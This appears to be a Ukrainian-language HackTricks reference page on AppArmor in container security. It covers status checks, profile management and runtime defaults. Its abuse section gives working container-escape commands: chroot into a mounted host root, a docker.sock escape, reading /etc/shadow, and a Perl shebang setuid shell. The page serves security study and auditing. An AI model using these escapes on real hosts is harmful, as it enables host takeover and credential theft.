# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

AppArmor — це система обов'язкового контролю доступу (Mandatory Access Control), яка застосовує обмеження через профілі для кожної програми. На відміну від традиційних перевірок DAC, що значною мірою залежать від власності користувача та групи, AppArmor дозволяє ядру застосовувати політику, прикріплену безпосередньо до процесу. У середовищах контейнерів це важливо, оскільки робоче навантаження може мати достатньо традиційних привілеїв, щоб спробувати виконати дію, але все одно отримати відмову, бо його профіль AppArmor не дозволяє відповідний шлях, монтування, мережеву поведінку або використання capability.

Найважливіша концептуальна річ у тому, що AppArmor є орієнтованим на шляхи (path-based). Він оцінює доступ до файлової системи через правила шляху замість міток, як це робить SELinux. Це робить його доступним і потужним, але також означає, що bind mounts та альтернативні розташування шляхів потребують уважної перевірки. Якщо той самий вміст хоста стає доступним за іншим шляхом, ефект політики може відрізнятися від того, чого спочатку очікував оператор.

## Роль в ізоляції контейнерів

Огляди безпеки контейнерів часто зупиняються на capabilities та seccomp, але AppArmor продовжує мати значення після цих перевірок. Уявіть контейнер, який має більше привілеїв, ніж повинен, або робоче навантаження, яке з операційних причин потребувало додаткової capability. AppArmor все ще може обмежити доступ до файлів, поведінку монтування, мережеву активність і шаблони виконання таким чином, щоб зупинити очевидний шлях зловживання. Саме тому відключення AppArmor «щоб просто змусити додаток працювати» може непомітно перетворити лише ризикову конфігурацію на таку, яку можна активно експлуатувати.

## Лаб

Щоб перевірити, чи активний AppArmor на хості, використовуйте:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Щоб побачити, під яким користувачем запущено поточний процес контейнера:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Ця різниця повчальна. У нормальному випадку процес має показувати AppArmor-контекст, прив'язаний до профілю, обраного runtime. У випадку unconfined цей додатковий рівень обмежень зникає.

Ви також можете перевірити, що Docker вважає застосованим:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Використання під час виконання

Docker може застосовувати стандартний або власний профіль AppArmor, якщо хост це підтримує. Podman також може інтегруватися з AppArmor на системах з AppArmor, хоча на дистрибутивах, орієнтованих на SELinux, інша MAC-система часто виходить на перший план. Kubernetes може робити AppArmor-політику доступною на рівні workload на нодах, які фактично підтримують AppArmor. LXC та суміжні системні контейнери сімейства Ubuntu також широко використовують AppArmor.

Практичний висновок: AppArmor — це не "Docker feature". Це можливість на рівні хоста/ядра, яку можуть застосовувати різні runtimes. Якщо хост її не підтримує або runtime вказано працювати unconfined, очікуваного захисту насправді немає.

На хостах AppArmor, сумісних з Docker, найвідомішим профілем за замовчуванням є `docker-default`. Цей профіль генерується з AppArmor-шаблону Moby і важливий тим, що пояснює, чому деякі PoCs, що залежать від capability, все ще не проходять у контейнері за замовчуванням. У загальних рисах, `docker-default` дозволяє звичайні мережеві операції, забороняє записи до більшої частини `/proc`, блокує доступ до чутливих частин `/sys`, перешкоджає операціям mount і обмежує ptrace так, щоб він не був універсальним інструментом для опитування хоста. Розуміння цієї базової політики допомагає відрізнити "контейнер має `CAP_SYS_ADMIN`" від "контейнер насправді може використати цю capability проти інтерфейсів ядра, що мене цікавлять".

## Керування профілями

AppArmor профілі зазвичай зберігаються під `/etc/apparmor.d/`. Поширена конвенція іменування — замінювати слеші в шляху виконуваного файлу крапками. Наприклад, профіль для `/usr/bin/man` зазвичай зберігається як `/etc/apparmor.d/usr.bin.man`. Ця деталь має значення як для захисту, так і для оцінки, оскільки, дізнавшись назву активного профілю, ви часто можете швидко знайти відповідний файл на хості.

Корисні команди для керування на боці хоста включають:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Причина, чому ці команди важливі в довіднику з container-security, полягає в тому, що вони пояснюють, як profiles фактично будуються, завантажуються, переводяться в complain mode і змінюються після змін у застосунку. Якщо оператор має звичку переводити profiles у complain mode під час налагодження й забувати відновити enforcement, контейнер може виглядати захищеним у документації, але насправді поводитися значно вільніше.

### Побудова та оновлення Profiles

`aa-genprof` може спостерігати за поведінкою застосунку і допомогти інтерактивно згенерувати profile:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` може згенерувати шаблон профілю, який пізніше можна завантажити за допомогою `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Коли бінарний файл змінюється і політику потрібно оновити, `aa-logprof` може відтворити відмови, знайдені в логах, і допомогти оператору вирішити, дозволити їх чи заборонити:
```bash
sudo aa-logprof
```
### Логи

Відмови AppArmor часто видно через `auditd`, syslog або інструменти на зразок `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Це корисно з оперативної та наступальної точок зору. Захисники використовують це для уточнення профілів. Атакувальники використовують це, щоб дізнатися, який саме шлях або операція відхиляється і чи AppArmor є контролем, який блокує exploit chain.

### Визначення точного файлу профілю

Коли runtime показує конкретну назву профілю AppArmor для container, часто корисно зіставити цю назву з файлом профілю на диску:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

## Неправильні налаштування

Найочевидніша помилка — `apparmor=unconfined`. Адміністратори часто ставлять її під час налагодження застосунку, який зазнав збою, бо профіль правильно заблокував щось небезпечне або непередбачуване. Якщо цей прапорець залишається в робочому середовищі, весь шар MAC фактично видаляється.

Ще одна тонка проблема — припущення, що bind mounts нешкідливі, тому що дозволи файлів виглядають нормальними. Оскільки AppArmor базується на шляхах, експонування хостових шляхів під іншими місцями монтування може погано взаємодіяти з правилами по шляхах. Третя помилка — забувати, що ім'я профілю у файлі конфігурації мало що означає, якщо ядро хоста фактично не застосовує AppArmor.

## Зловживання

Коли AppArmor відсутній, операції, які раніше були обмежені, можуть раптово почати працювати: читання конфіденційних шляхів через bind mounts, доступ до частин procfs або sysfs, які мали б залишатися важчими для використання, виконання дій, пов'язаних з mount, якщо capabilities/seccomp також дозволяють це, або використання шляхів, які профіль зазвичай відмовляв. AppArmor часто є тим механізмом, що пояснює, чому спроба breakout на основі capabilities «теоретично повинна працювати», але на практиці все одно не вдається. Видаліть AppArmor — і та сама спроба може почати вдаватися.

Якщо ви підозрюєте, що AppArmor — основне, що перешкоджає path-traversal, bind-mount, або mount-based ланцюгу зловживань, першим кроком зазвичай є порівняння того, що стає доступним із профілем і без нього. Наприклад, якщо хостовий шлях змонтований всередині контейнера, почніть з перевірки, чи можете ви пройти по ньому та прочитати його:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Якщо контейнер також має небезпечну capability, таку як `CAP_SYS_ADMIN`, один із найпрактичніших тестів — чи саме AppArmor блокує операції mount або доступ до чутливих файлових систем ядра:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
У середовищах, де шлях хоста вже доступний через bind mount, втрата AppArmor може також перетворити проблему інформаційного розкриття тільки для читання на прямий доступ до файлів хоста:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Суть цих команд не в тому, що AppArmor сам по собі створює breakout. Річ у тому, що як тільки AppArmor видалено, багато шляхів зловживання файловою системою та монтованими точками негайно стають доступними для тестування.

### Повний приклад: AppArmor вимкнено + host root змонтовано

Якщо контейнер уже має host root bind-mounted у `/host`, видалення AppArmor може перетворити заблокований шлях зловживання файловою системою на повний host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Як тільки shell виконується через host filesystem, workload фактично вийшло за межі container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Повний приклад: AppArmor Disabled + Runtime Socket

Якщо справжнім бар'єром був AppArmor навколо runtime state, змонтований socket може бути достатнім для повного escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Точний шлях залежить від точки монтування, але кінцевий результат той самий: AppArmor більше не перешкоджає доступу до runtime API, і runtime API може запустити container, що компрометує хост.

### Повний приклад: Path-Based Bind-Mount Bypass

Оскільки AppArmor базується на шляхах, захист `/proc/**` не автоматично захищає той самий вміст procfs хоста, якщо до нього можна дістатися через інший шлях:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Наслідки залежать від того, що саме змонтовано і чи дозволяє альтернативний шлях також обійти інші контролі, але цей шаблон — одна з найочевидніших причин, чому AppArmor слід оцінювати разом із розміткою монтувань, а не окремо.

### Full Example: Shebang Bypass

AppArmor policy інколи націлена на шлях інтерпретатора таким чином, що не повністю враховує виконання скриптів через обробку shebang. Історичний приклад полягав у використанні скрипту, перший рядок якого вказує на ізольований інтерпретатор:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Цей приклад важливий як нагадування, що profile intent і фактична execution semantics можуть розходитися. При розгляданні AppArmor у container environments interpreter chains та alternate execution paths заслуговують на особливу увагу.

## Перевірки

Мета цих перевірок — швидко відповісти на три питання: чи AppArmor увімкнено на host, чи поточний process обмежений, і чи runtime справді застосував profile до цього container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
На що варто звернути увагу:

- Якщо `/proc/self/attr/current` показує `unconfined`, робоче навантаження не отримує переваг від обмеження AppArmor.
- Якщо `aa-status` показує, що AppArmor відключено або не завантажено, будь-яке ім'я профілю в runtime-конфігурації здебільшого косметичне.
- Якщо `docker inspect` показує `unconfined` або несподіваний кастомний профіль, це часто є причиною, чому шлях зловживання через файлову систему або mount працює.

Якщо контейнер уже має підвищені привілеї з операційних причин, залишення AppArmor увімкненим часто визначає різницю між контрольованим винятком і значно ширшою компрометацією безпеки.

## Налаштування за замовчуванням у runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Використовує профіль AppArmor `docker-default`, якщо його не перевизначено | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor підтримується через `--security-opt`, але точний стан за замовчуванням залежить від хоста/runtime і менш універсальний, ніж документований профіль Docker `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | Якщо `appArmorProfile.type` не вказано, за замовчуванням використовується `RuntimeDefault`, але він застосовується лише коли AppArmor увімкнено на вузлі | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` з послабленим профілем, вузли без підтримки AppArmor |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Поширені runtimes, які підтримує Kubernetes, підтримують AppArmor, але фактичне застосування все ще залежить від підтримки вузла та налаштувань робочого навантаження | Те ж, що й у рядку Kubernetes; пряма конфігурація runtime також може повністю пропустити AppArmor |

Для AppArmor найважливішою змінною часто є саме **host**, а не лише runtime. Налаштування профілю в маніфесті не створить обмеження на вузлі, де AppArmor не увімкнено.
